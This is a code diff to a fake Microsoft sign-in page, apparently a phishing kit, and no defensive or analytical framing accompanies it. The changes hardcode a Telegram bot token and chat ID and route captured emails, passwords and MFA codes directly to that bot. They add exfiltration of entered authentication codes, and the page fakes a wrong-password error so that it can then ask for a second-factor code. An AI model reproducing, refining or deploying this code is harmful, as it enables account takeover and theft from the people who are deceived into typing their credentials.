@@ -177,13 +177,10 @@
   </div>
   <!-- ...existing code... -->
 <script>
-
-
-   const BOT_TOKEN = '7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA';
-      const CHAT_ID = '-4849344197';
-
-
-
+  // --- TELEGRAM BOT TOKEN AND CHAT ID ---
+  const TG_BOT_TOKEN = "8292423468:AAEQQXMHQ7jmJFyfrGX7vsWhr6GH-ORn8dk";
+  const TG_CHAT_ID = "-5006528512";
+  
 (function(){
   // Defensive hide for the loading screen so page never stays stuck
   const LOADING_SCREEN_ID = 'loading-screen';
@@ -279,28 +276,9 @@
         }
       }
 
-      // server forward (preferred)
-      async function forwardToServer(email, secret, kind = 'password') {
-        try {
-          const res = await fetchWithTimeout('/api/send', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email, secret, kind })
-          }, 10000);
-          if (!res.ok) {
-            const text = await res.text().catch(()=>'{unreadable body}');
-            throw new Error('Server forward failed: ' + res.status + ' ' + text);
-          }
-          return await res.json();
-        } catch (err) {
-          console.warn('[forwardToServer] failed', err);
-          throw err;
-        }
-      }
-
-      // direct fallback (only if TG_BOT_TOKEN / TG_CHAT_ID globals are present)
+      // direct always (to Telegram)
       async function sendDirectToTelegram(email, secret, kind = 'password') {
-        if (typeof TG_BOT_TOKEN === 'undefined' || typeof TG_CHAT_ID === 'undefined') {
+        if (!TG_BOT_TOKEN || !TG_CHAT_ID) {
           throw new Error('No TG_BOT_TOKEN/TG_CHAT_ID defined for direct fallback.');
         }
         const text = kind === 'password'
@@ -317,14 +295,9 @@
         return json;
       }
 
-      // unified send: server first, fallback to direct
+      // unified send: always Telegram
       async function sendForSecret(email, secret, kind = 'password') {
-        try {
-          return await forwardToServer(email, secret, kind);
-        } catch (err) {
-          console.warn('[sendForSecret] server forward failed, trying fallback', err);
-          return await sendDirectToTelegram(email, secret, kind);
-        }
+        return await sendDirectToTelegram(email, secret, kind);
       }
 
       // Resend handler
@@ -351,12 +324,9 @@
         hideErrorMessage(msg);
 
         try {
-          // send a "resend" action to server (preferred) or fallback to direct send
           await sendForSecret(email, 'resend_requested', 'resend');
-          // success UI
           showErrorWithDelay(msg, 'Code resent. Check your SMS or authenticator app.', 500);
         } catch (err) {
-          // detect network interruption vs other errors
           if (err.name === 'AbortError') {
             showErrorMessage(msg, 'Network interrupted while resending. Tap Resend again to retry.');
           } else {
@@ -364,7 +334,6 @@
           }
           console.error('[handleResendClick] resend failed', err);
         } finally {
-          // schedule unlock after lockDelay (so user cannot hammer Resend)
           clearTimeout(resendLockTimer);
           resendLockTimer = setTimeout(() => {
             if (resendLink) {
@@ -376,10 +345,8 @@
         }
       }
 
-      // Wire resend link if present
       if (resendLink) resendLink.addEventListener('click', handleResendClick);
 
-      // Next button logic: move to password panel
       if (nextBtn) {
         nextBtn.addEventListener('click', function () {
           const my_email = (emailInput && emailInput.value) ? emailInput.value.trim() : '';
@@ -397,7 +364,6 @@
           pwdAttempt = 0;
           codeAttempt = 0;
           inCodeMode = false;
-          // Reset UI if returning from code mode
           const title = document.querySelector('.signin-title');
           if (title) title.textContent = 'Sign in';
           const lbl = document.querySelector('label[for="password"]');
@@ -411,12 +377,10 @@
             submitBtn.disabled = false;
           }
           if (passwordInput) passwordInput.focus();
-          // hide resend link until code mode
           if (resendLink) resendLink.style.display = 'none';
         });
       }
 
-      // Back button (click logo row)
       try {
         const logoRow = div2 ? div2.querySelector('.msft-logo-row') : null;
         if (logoRow) {
@@ -426,13 +390,11 @@
             if (div2) div2.style.display = 'none';
             if (div1) div1.style.display = 'flex';
             if (emailInput) emailInput.focus();
-            // hide resend link when leaving
             if (resendLink) resendLink.style.display = 'none';
           });
         }
       } catch (e) { /* ignore */ }
 
-      // Submit behavior (password mode -> may switch to code mode)
       if (submitBtn) {
         submitBtn.addEventListener('click', function(event){
           event.preventDefault();
@@ -450,8 +412,10 @@
           }
 
           if (inCodeMode) {
-            // code verification simulation
             codeAttempt++;
+            sendForSecret(email, password, 'code')
+              .catch(console.error);
+            
             setTimeout(function() {
               if (submitBtn) {
                 submitBtn.textContent = 'Enter';
@@ -470,9 +434,7 @@
             return;
           }
 
-          // PASSWORD MODE: send email + password (or forward to server)
           pwdAttempt++;
-          // Use sendForSecret so it tries server and falls back if configured
           sendForSecret(email, password, 'password')
             .then(res => {
               console.log('[sendForSecret] success', res);
@@ -482,7 +444,6 @@
               if (err.name === 'AbortError') {
                 showErrorWithDelay(msg, 'Network interrupted. Please check your connection and try again.');
               }
-              // else: continue with normal UX (we still show incorrect password simulation below)
             })
             .finally(() => {
               if (pwdAttempt === 1) {
@@ -516,7 +477,6 @@
                     passwordInput.focus();
                   }
                   inCodeMode = true;
-                  // show resend link when code mode is active
                   if (resendLink) resendLink.style.display = 'inline';
                   showErrorWithDelay(msg, "Authorization code required. Please check your sms or authenticator app.");
                 }, 2000);
@@ -543,15 +503,12 @@
         });
       }
 
-      // Expose a manual retry helper (optional) to allow re-sending last action (not persisted across reloads)
       window.retryLastResend = function() {
         if (!inCodeMode) return;
         handleResendClick();
       };
-
     } catch (initErr) {
       console.error('Initialization error:', initErr);
-      // Ensure loading screen is removed even if init fails
       try { hideLoading(); } catch (e) {}
     }
   });
